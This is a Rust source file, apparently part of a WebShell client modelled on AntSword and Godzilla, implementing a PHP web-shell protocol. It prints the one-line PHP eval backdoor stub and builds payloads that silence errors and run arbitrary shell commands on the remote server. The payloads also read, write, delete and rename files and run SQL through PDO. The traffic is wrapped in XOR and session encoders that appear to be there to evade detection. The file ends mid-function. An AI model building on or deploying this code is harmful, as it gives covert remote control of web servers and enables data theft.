//! 标准 PHP WebShell 协议（类蚁剑风格）。
//!
//! 服务端 stub 由用户自行部署到授权目标：
//! ```php
//! <?php @eval(base64_decode($_POST['x']));
//! ```
//! 客户端每次操作生成一段 PHP 代码，base64 后经 POST 参数 `x` 发送；
//! 代码将结果包裹在随机 `nonce` 帧内输出，客户端按 nonce 定位解析。
//! 所有路径 / 命令参数均以 base64 字面量嵌入代码，规避引号与转义问题。
//!
//! 本协议只生成白名单模板，不提供任意 PHP 代码透传入口。

use std::any::Any;
use std::collections::VecDeque;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{LazyLock, Mutex};
use std::time::Instant;

use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;
use serde_json::Value;

use dosword_sdk::domain::{
    AppSettings, CommandOutput, DbConnection, DbProbeResult, DbQueryResult, DirListing, FileEntry,
    ProbeResult, RequestRecord, ShellProfile,
};

use super::transport::build_client;
use dosword_sdk::encoder::{EncoderRegistry, NativeEncoder, PayloadEncoder};
use dosword_sdk::{PluginKind, PluginManifest, ProtocolPlugin};
use dosword_sdk::{Protocol, ProtocolError, SessionState};

pub const PHP_PROTOCOL_ID: &str = "builtin.php.v1";

/// 编码器是否启用分阶段载荷模式：`"session": true` 或编码器本身为 xor_session。
fn session_mode_for(protocol_params: &str, encoder: &dyn PayloadEncoder) -> bool {
    if encoder.id() == "xor_session" {
        return true;
    }
    session_enabled(protocol_params) && encoder.id() != "php_stream"
}

/// 分阶段载荷（Godzilla session 模式）是否启用：protocol_params 中 `"session": true`。
fn session_enabled(protocol_params: &str) -> bool {
    serde_json::from_str::<serde_json::Value>(protocol_params)
        .ok()
        .and_then(|value| value.get("session").and_then(|item| item.as_bool()))
        .unwrap_or(false)
}

/// 从 `protocol_params`（JSON）解析编码器 id，缺省 base64（兼容旧配置与旧 stub）。
fn encoder_for(protocol_params: &str) -> &'static dyn PayloadEncoder {
    let encoder_id: Option<String> = serde_json::from_str::<serde_json::Value>(protocol_params)
        .ok()
        .and_then(|value| value.get("encoder").and_then(|item| item.as_str().map(str::to_string)));
    match encoder_id.as_deref() {
        Some(id) => EncoderRegistry::global().get(id).unwrap_or(&dosword_sdk::encoder::NATIVE_XOR),
        None => &dosword_sdk::encoder::NATIVE_XOR,
    }
}

impl ProtocolPlugin for PhpProtocol {
    fn manifest(&self) -> PluginManifest {
        PluginManifest {
            id: PHP_PROTOCOL_ID.to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: PluginKind::Protocol,
            description: "标准 PHP WebShell（类蚁剑）：命令执行、文件管理、数据库操作。".to_string(),
            capabilities: vec![
                "files".to_string(),
                "terminal".to_string(),
                "database".to_string(),
            ],
        }
    }
}

/// PHP 协议的会话状态：持有专用 HTTP 客户端（每会话独立，避免跨会话并发干扰）。
pub struct PhpSession {
    pub endpoint: String,
    pub password: String,
    pub client: reqwest::blocking::Client,
    /// 载荷编码器（连接时由 protocol_params 决定）。
    pub encoder: &'static dyn PayloadEncoder,
    /// Godzilla 分阶段载荷：处理器代码是否已注入服务端 session。
    pub initialized: std::sync::Mutex<bool>,
    /// 分阶段载荷模式（protocol_params 中 session: true 且编码器支持）。
    pub session_mode: bool,
}

impl SessionState for PhpSession {
    fn as_any(&self) -> &dyn Any {
        self
    }
}

/// PHP 协议实例（无状态单例）。
pub struct PhpProtocol;

/// 服务端代码模板的前缀：静默错误 + 鉴权。
/// 所有操作代码都拼接在它之后，并以 `{NONCE}` 帧收尾。
/// 服务端代码模板的前缀：静默错误 + 鉴权。
/// `{PARAM_K}` 为密码参数名（业务伪装模板为 token，标准模板为 k）。
const TEMPLATE_PREFIX: &str = r#"@ini_set("display_errors","0");@error_reporting(0);@set_time_limit(0);if(@$_POST['{PARAM_K}']!=='{PWD}'){die('AUTH_FAIL');}"#;

/// 每个操作的公共收尾：输出 nonce 帧。
/// 调用方应把业务结果写入 `$__r`（PHP 数组），本段负责序列化输出。
const TEMPLATE_FRAME: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;

/// 错误分支的收尾：先输出错误帧再终止，保证客户端能解析到业务错误。
const TEMPLATE_FRAME_DIE: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';die;"#;

/// 数据库驱动白名单（Rust 侧校验，防止任意 DSN 注入）。
const DB_DRIVERS: [&str; 3] = ["mysql", "pgsql", "sqlite"];

/// 数据库探测载荷：PDO 连接 + 列出数据库。
/// 占位符：{PWD} {DSN} {USER} {PASS} {LIST_DBS} {DBNAME} {DRIVER}
const DB_PROBE_CODE: &str = r#"@ini_set("display_errors","0");@error_reporting(0);if(@$_POST['{PARAM_K}']!=='{PWD}'){die('AUTH_FAIL');}
$dsn=base64_decode('{DSN}');$u=base64_decode('{USER}');$w=base64_decode('{PASS}');
try{$dbh=new PDO($dsn,$u,$w,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
$q=base64_decode('{LIST_DBS}');
if($q===''){$dbs=array(base64_decode('{DBNAME}'));}else{$dbs=array();foreach($dbh->query($q) as $r){$dbs[]=$r[0];}}
$__r=array('ok'=>true,'data'=>array('driver'=>'{DRIVER}','databases'=>$dbs));
}catch(Exception $e){$__r=array('ok'=>false,'error'=>'数据库连接失败：'.$e->getMessage());}
echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;

/// 数据库查询载荷：连接 + 执行 SQL + 结果（查询返回列与行，非查询返回影响行数）。
/// 占位符：{PWD} {DSN} {USER} {PASS} {SQL}
const DB_QUERY_CODE: &str = r#"@ini_set("display_errors","0");@error_reporting(0);if(@$_POST['{PARAM_K}']!=='{PWD}'){die('AUTH_FAIL');}
$dsn=base64_decode('{DSN}');$u=base64_decode('{USER}');$w=base64_decode('{PASS}');
try{$dbh=new PDO($dsn,$u,$w,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
$sql=base64_decode('{SQL}');
$stmt=$dbh->query($sql);
if($stmt===false){$__r=array('ok'=>false,'error'=>'SQL 执行失败');}
elseif(preg_match('/^\s*(select|show|desc|describe|explain|pragma|with)\b/i',$sql)){
$cols=array();$n=$stmt->columnCount();for($i=0;$i<$n;$i++){$m=$stmt->getColumnMeta($i);$cols[]=(isset($m['name'])&&$m['name']!=='')?$m['name']:('col'.$i);}
$rows=array();$cnt=0;
while(($r=$stmt->fetch(PDO::FETCH_NUM))!==false&&$cnt<1000){$row=array();foreach($r as $v){$row[]=($v===null)?null:(string)$v;}$rows[]=$row;$cnt++;}
$__r=array('ok'=>true,'data'=>array('columns'=>$cols,'rows'=>$rows,'affected'=>0));
}else{$__r=array('ok'=>true,'data'=>array('columns'=>array(),'rows'=>array(),'affected'=>$stmt->rowCount()));}
}catch(Exception $e){$__r=array('ok'=>false,'error'=>'数据库操作失败：'.$e->getMessage());}
echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;

// ---------------------------------------------------------------------------
// 请求调试：进程内环缓冲，记录每条协议帧（载荷 / 响应），供「请求调试」页查看。
// 仅调试用途，不落盘；密码在载荷预览中脱敏。
// ---------------------------------------------------------------------------

/// 载荷 / 响应预览截断长度。
const DEBUG_PREVIEW_LEN: usize = 2048;
/// 环缓冲容量。
const DEBUG_LOG_CAP: usize = 200;

static REQUEST_LOG: LazyLock<Mutex<VecDeque<RequestRecord>>> =
    LazyLock::new(|| Mutex::new(VecDeque::with_capacity(DEBUG_LOG_CAP)));
static REQUEST_COUNTER: AtomicU64 = AtomicU64::new(0);

/// 记录一条协议请求（由 send_frame 调用）。
fn record_request(
    action: &str,
    endpoint: &str,
    status: u16,
    duration_ms: u64,
    code: &str,
    response: &str,
    password: &str,
) {
    // 载荷脱敏：密码字面量替换为 ***（密码为空时跳过，避免 replace("") 异常）
    let payload = if password.is_empty() {
        code.to_string()
    } else {
        code.replace(password, "***")
    };
    let mut record = RequestRecord {
        id: REQUEST_COUNTER.fetch_add(1, Ordering::Relaxed),
        endpoint: endpoint.to_string(),
        action: action.to_string(),
        created_at: chrono::Utc::now().to_rfc3339(),
        status,
        duration_ms,
        payload: truncate(&payload),
        response: truncate(response),
    };
    // 响应里可能残留明文密码（如 AUTH_FAIL 回显外的场景），一并脱敏
    record.response = if password.is_empty() {
        record.response
    } else {
        record.response.replace(password, "***")
    };
    let mut log = REQUEST_LOG.lock().expect("请求日志锁异常");
    if log.len() >= DEBUG_LOG_CAP {
        log.pop_front();
    }
    log.push_back(record);
}

fn truncate(value: &str) -> String {
    let mut chars = value.chars();
    let head: String = chars.by_ref().take(DEBUG_PREVIEW_LEN).collect();
    if chars.next().is_some() {
        format!("{head}\n…（已截断）")
    } else {
        head
    }
}

/// 列出请求记录（可选按端点过滤），新记录在前。
pub fn list_requests(endpoint: Option<&str>) -> Vec<RequestRecord> {
    let log = REQUEST_LOG.lock().expect("请求日志锁异常");
    log.iter()
        .rev()
        .filter(|record| endpoint.map_or(true, |target| record.endpoint == target))
        .cloned()
        .collect()
}

/// 清空请求记录。
pub fn clear_requests() {
    REQUEST_LOG.lock().expect("请求日志锁异常").clear();
}

impl PhpProtocol {
    // --- Godzilla 分阶段载荷操作（xor_session） ---

    fn session_probe(
        &self,
        php: &PhpSession,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        let value = dispatch(php, "probe", &[], settings)?;
        let get = |key: &str| -> String {
            value
                .pointer(&format!("/data/{key}"))
                .and_then(|v| v.as_str())
                .unwrap_or("未知")
                .to_string()
        };
        Ok(ProbeResult {
            status: "online".to_string(),
            server: get("server"),
            web_server: get("web_server"),
            runtime: get("php_version"),
            current_dir: get("current_dir"),
            separator: get("separator"),
            message: "分阶段载荷探测成功。".to_string(),
        })
    }

    fn session_exec(
        &self,
        php: &PhpSession,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        let start = Instant::now();
        let value = dispatch(php, "exec", &[("c", command)], settings)?;
        let duration_ms = start.elapsed().as_millis() as u64;
        let stdout = value
            .pointer("/data/stdout")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .and_then(|bytes| String::from_utf8(bytes).ok())
            .unwrap_or_default();
        let cwd = value
            .pointer("/data/cwd")
            .and_then(|v| v.as_str())
            .map(str::to_string);
        Ok(CommandOutput {
            stdout,
            duration_ms,
            cwd,
        })
    }

    fn session_list_dir(
        &self,
        php: &PhpSession,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        let value = dispatch(php, "list", &[("p", path)], settings)?;
        let entries = value
            .pointer("/data/entries")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|item| FileEntry {
                        name: item.get("name").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                        path: item.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                        is_dir: item.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false),
                        size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
                        modified: item
                            .get("mtime")
                            .and_then(|v| v.as_i64())
                            .map(format_timestamp)
                            .unwrap_or_default(),
                    })
                    .collect()
            })
            .unwrap_or_default();
        Ok(DirListing { entries })
    }

    fn session_read_file(
        &self,
        php: &PhpSession,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let value = dispatch(php, "read", &[("p", path)], settings)?;
        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn session_write_file(
        &self,
        php: &PhpSession,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        session_call(
            php,
            "write",
            &[("p", path), ("d", &B64.encode(content))],
            settings,
        )?;
        Ok(())
    }

    fn session_delete(
        &self,
        php: &PhpSession,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(php, "delete", &[("p", path)], settings)?;
        Ok(())
    }

    fn session_rename(
        &self,
        php: &PhpSession,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(php, "rename", &[("f", from), ("t", to)], settings)?;
        Ok(())
    }

    fn session_mkdir(
        &self,
        php: &PhpSession,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(php, "mkdir", &[("p", path)], settings)?;
        Ok(())
    }

    fn session_db_probe(
        &self,
        php: &PhpSession,
        connection: &DbConnection,
        settings: &AppSettings,
    ) -> Result<DbProbeResult, ProtocolError> {
        let value = dispatch(php, "dbprobe", &[("c", &conn_json(connection))], settings)?;
        let databases = value
            .pointer("/data/databases")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        Ok(DbProbeResult {
            driver: connection.driver.clone(),
            databases,
            message: "数据库连接成功".to_string(),
        })
    }

    fn session_db_query(
        &self,
        php: &PhpSession,
        connection: &DbConnection,
        sql: &str,
        settings: &AppSettings,
    ) -> Result<DbQueryResult, ProtocolError> {
        let value = session_call(
            php,
            "dbquery",
            &[("c", &conn_json(connection)), ("q", sql)],
            settings,
        )?;
        let columns = value
            .pointer("/data/columns")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        let rows = value
            .pointer("/data/rows")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|row| {
                        row.as_array()
                            .map(|cells| {
                                cells
                                    .iter()
                                    .map(|cell| {
                                        if cell.is_null() {
                                            None
                                        } else {
                                            Some(cell.as_str().unwrap_or("").to_string())
                                        }
                                    })
                                    .collect()
                            })
                            .unwrap_or_default()
                    })
                    .collect()
            })
            .unwrap_or_default();
        let affected = value
            .pointer("/data/affected")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);
        Ok(DbQueryResult {
            columns,
            rows,
            affected,
            duration_ms: 0,
        })
    }

    /// 将 `params` 逐项替换进模板的 `{key}` 占位符。
    fn build_code(template: &str, params: &[(&str, &str)]) -> String {
        let mut code = template.to_string();
        for (key, value) in params {
            code = code.replace(&format!("{{{key}}}"), value);
        }
        code
    }

    /// 构建鉴权前缀（密码参数名随编码器业务伪装模板变化：token / k）。
    /// body 模式（php_stream）载荷不经表单传输，stub 无鉴权，前缀不包含密码比较。
    fn build_prefix(encoder: &dyn PayloadEncoder, password: &str) -> String {
        if encoder.body_mode() {
            return "@ini_set(\"display_errors\",\"0\");@error_reporting(0);@set_time_limit(0);"
                .to_string();
        }
        let (key_param, _) = encoder.form_params();
        Self::build_code(
            TEMPLATE_PREFIX,
            &[("PARAM_K", key_param), ("PWD", password)],
        )
    }

    /// 发送一次协议请求并解析 nonce 帧，返回业务 JSON 值。
    ///
    /// 帧协议：调用方生成的 `code` 中必须包含 `echo '{nonce}';`（nonce 由本方法
    /// 随机生成并替换 `{NONCE}` 占位符），服务器会原样回显该 nonce，响应中
    /// 两个 nonce 之间的部分即协议帧。
    fn send_frame(
        &self,
        client: &reqwest::blocking::Client,
        endpoint: &str,
        password: &str,
        code_template: &str,
        settings: &AppSettings,
        action: &str,
        encoder: &dyn PayloadEncoder,
    ) -> Result<Value, ProtocolError> {
        // 8 字节随机 nonce（hex 字符串）
        let nonce = random_nonce();
        let start = Instant::now();
        let code = code_template.replace("{NONCE}", &nonce);

        // 按编码器编码载荷（与服务端 stub 的解码逻辑对应）
        // body 模式（如 php_stream）：载荷直传请求体，stub 用 include 流执行；
        // 表单模式：POST k（密码）+ x（编码后载荷）。
        let body = if encoder.body_mode() {
            encoder.encode(&code, password)
        } else {
            let (key_param, data_param) = encoder.form_params();
            url::form_urlencoded::Serializer::new(String::new())
                .append_pair(key_param, password)
                .append_pair(data_param, &encoder.encode(&code, password))
                .finish()
        };

        let response = client
            .post(endpoint)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(body)
            .send()
            .map_err(|error| ProtocolError::Network(error.to_string()))?;

        let status = response.status();
        let duration_ms = start.elapsed().as_millis() as u64;

        if !status.is_success() {
            return Err(ProtocolError::HttpStatus(
                status.as_u16(),
                status.canonical_reason().unwrap_or("").to_string(),
            ));
        }

        let bytes = response
            .bytes()
            .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
        let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
        if bytes.len() > max_bytes as usize {
            return Err(ProtocolError::ParseError(format!(
                "响应超过大小上限（{}MB）",
                settings.max_file_size_mb
            )));
        }
        let text = String::from_utf8_lossy(&bytes);

        // 调试记录（先于错误分支，失败请求同样留痕）
        record_request(
            action,
            endpoint,
            status.as_u16(),
            duration_ms,
            &code,
            &text,
            password,
        );

        // 鉴权失败时服务器直接输出明文 AUTH_FAIL（无帧）
        if text.contains("AUTH_FAIL") {
            return Err(ProtocolError::AuthFailed(
                "密码错误，服务器拒绝鉴权".to_string(),
            ));
        }

        // 按 nonce 帧定位响应体（帧外杂散输出天然免疫）
        let start = text.find(&nonce).ok_or_else(|| {
            ProtocolError::ParseError(
                "响应中未找到协议帧（请确认目标运行的是标准 PHP 协议 stub）".to_string(),
            )
        })?;
        let tail = &text[start + nonce.len()..];
        let end = tail.find(&nonce).ok_or(ProtocolError::ParseError(
            "协议帧不完整（响应被截断）".to_string(),
        ))?;
        let payload = &tail[..end];

        let decoded = B64
            .decode(payload)
            .map_err(|_| ProtocolError::ParseError("帧内容不是合法 Base64".to_string()))?;
        let value: Value = serde_json::from_slice(&decoded)
            .map_err(|_| ProtocolError::ParseError("帧内容不是合法 JSON".to_string()))?;

        if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
            let error = value
                .get("error")
                .and_then(|v| v.as_str())
                .unwrap_or("未知错误")
                .to_string();
            return Err(ProtocolError::ServerError(error));
        }

        Ok(value)
    }
}

/// 8 字节真随机 nonce（hex 字符串），用于帧定位与防注入。
fn random_nonce() -> String {
    let mut bytes = [0u8; 8];
    // 随机源失败时退化为时间戳低位，仍能保证帧唯一性（仅防注入强度降低）
    if getrandom::fill(&mut bytes).is_err() {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|duration| duration.subsec_nanos())
            .unwrap_or(0);
        bytes = (nanos as u64).to_le_bytes();
    }
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

/// 将 unix 时间戳格式化为本地时间的 `YYYY-MM-DD HH:MM`。
fn format_timestamp(ts: i64) -> String {
    use chrono::{DateTime, Local};
    DateTime::from_timestamp(ts, 0)
        .map(|datetime| datetime.with_timezone(&Local).format("%Y-%m-%d %H:%M").to_string())
        .unwrap_or_default()
}

impl Protocol for PhpProtocol {
    fn id(&self) -> &'static str {
        PHP_PROTOCOL_ID
    }

    fn display_name(&self) -> &'static str {
        "标准 PHP WebShell（类蚁剑）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        // 环境信息探测：不产生任何文件系统副作用
        let encoder = encoder_for(&profile.protocol_params);
        if encoder.id().starts_with("native") || always_session(encoder.id()) {
            // NATIVE 与自加密编码器恒走分阶段会话通道
            let php = PhpSession {
                endpoint: profile.endpoint.clone(),
                password: profile.password.clone(),
                client: build_client(settings),
                encoder,
                initialized: std::sync::Mutex::new(false),
                session_mode: false,
            };
            return self.session_probe(&php, settings);
        }
        if session_mode_for(&profile.protocol_params, encoder) {
            let php = PhpSession {
                endpoint: profile.endpoint.clone(),
                password: profile.password.clone(),
                client: build_client(settings),
                encoder,
                initialized: std::sync::Mutex::new(false),
                session_mode: true,
            };
            return self.session_probe(&php, settings);
        }
        let code = format!(
            "{}\n$__r=array('ok'=>true,'data'=>array('server'=>php_uname('s').' '.php_uname('r').' '.php_uname('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>getcwd(),'separator'=>DIRECTORY_SEPARATOR));{}",
            Self::build_prefix(encoder, &profile.password),
            TEMPLATE_FRAME
        );
        let client = build_client(settings);
        let value = self.send_frame(
            &client,
            &profile.endpoint,
            &profile.password,
            &code,
            settings,
            "probe",
            encoder,
        )?;

        let server = value
            .pointer("/data/server")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let web_server = value
            .pointer("/data/web_server")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let runtime = value
            .pointer("/data/php_version")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let current_dir = value
            .pointer("/data/current_dir")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let separator = value
            .pointer("/data/separator")
            .and_then(|v| v.as_str())
            .unwrap_or("/")
            .to_string();

        Ok(ProbeResult {
            status: "online".to_string(),
            server,
            web_server,
            runtime,
            current_dir,
            separator,
            message: "PHP 协议探测成功，返回真实环境信息。".to_string(),
        })
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        // 先探测验证密码与连通性，再建立会话
        let result = self.probe(profile, settings)?;
        let encoder = encoder_for(&profile.protocol_params);
        let session: Box<dyn SessionState> = Box::new(PhpSession {
            endpoint: profile.endpoint.clone(),
            password: profile.password.clone(),
            client: build_client(settings),
            encoder,
            initialized: std::sync::Mutex::new(false),
            session_mode: session_mode_for(&profile.protocol_params, encoder),
        });
        Ok((session, result))
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        if is_session(php) {
            return self.session_exec(php, command, settings);
        }
        let cmd_b64 = B64.encode(command.as_bytes());
        let code = format!(
            "{}\n$c=base64_decode('{cmd_b64}');$o=@shell_exec($c.' 2>&1');$__r=array('ok'=>true,'data'=>array('stdout'=>base64_encode((string)$o),'cwd'=>getcwd()));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME
        );
        let start = Instant::now();
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "exec", php.encoder)?;
        let duration_ms = start.elapsed().as_millis() as u64;

        let stdout = value
            .pointer("/data/stdout")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .and_then(|bytes| String::from_utf8(bytes).ok())
            .unwrap_or_default();
        let cwd = value
            .pointer("/data/cwd")
            .and_then(|v| v.as_str())
            .map(str::to_string);

        Ok(CommandOutput { stdout, duration_ms, cwd })
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        if is_session(php) {
            return self.session_list_dir(php, path, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$d=@scandir($p);if($d===false){{$__r=array('ok'=>false,'error'=>'无法读取目录');{} }}$out=array();foreach($d as $f){{if($f==='.'||$f==='..')continue;$full=$p.DIRECTORY_SEPARATOR.$f;$is_dir=is_dir($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$is_dir,'size'=>$is_dir?0:filesize($full),'mtime'=>filemtime($full));}}$__r=array('ok'=>true,'data'=>array('entries'=>$out));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "list_dir", php.encoder)?;

        let entries: Vec<FileEntry> = value
            .pointer("/data/entries")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|item| FileEntry {
                        name: item.get("name").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                        path: item.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                        is_dir: item.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false),
                        size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
                        modified: item
                            .get("mtime")
                            .and_then(|v| v.as_i64())
                            .map(format_timestamp)
                            .unwrap_or_default(),
                    })
                    .collect()
            })
            .unwrap_or_default();

        Ok(DirListing { entries })
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        if is_session(php) {
            return self.session_read_file(php, path, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$c=@file_get_contents($p);if($c===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}$__r=array('ok'=>true,'data'=>base64_encode($c));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "read_file", php.encoder)?;

        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        if is_session(php) {
            return self.session_write_file(php, path, content, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let data_b64 = B64.encode(content);
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$d=base64_decode('{data_b64}');$r=@file_put_contents($p,$d);if($r===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>$r));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "write_file", php.encoder)?;
        Ok(())
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        if is_session(php) {
            return self.session_delete(php, path, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');if(is_dir($p)){{$r=@rmdir($p);}}else{{$r=@unlink($p);}}if($r===false){{$__r=array('ok'=>false,'error'=>'删除失败（目录非空或权限不足）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "delete", php.encoder)?;
        Ok(())
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        if is_session(php) {
            return self.session_rename(php, from, to, settings);
        }
        let from_b64 = B64.encode(from.as_bytes());
        let to_b64 = B64.encode(to.as_bytes());
        let code = format!(
            "{}\n$f=base64_decode('{from_b64}');$t=base64_decode('{to_b64}');$r=@rename($f,$t);if($r===false){{$__r=array('ok'=>false,'error'=>'重命名失败');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "rename", php.encoder)?;
        Ok(())
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        if is_session(php) {
            return self.session_mkdir(php, path, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$r=@mkdir($p,0755,true);if($r===false){{$__r=array('ok'=>false,'error'=>'创建目录失败（权限不足或已存在）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "mkdir", php.encoder)?;
        Ok(())
    }

    fn read_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        offset: u64,
        length: u64,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$off={off};$len={len};$f=@fopen($p,'rb');if($f===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}\nif($off>0){{@fseek($f,$off);}}$c=($len>0)?@fread($f,$len):@stream_get_contents($f);@fclose($f);$__r=array('ok'=>true,'data'=>base64_encode((string)$c));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME,
            off = offset,
            len = length,
        );
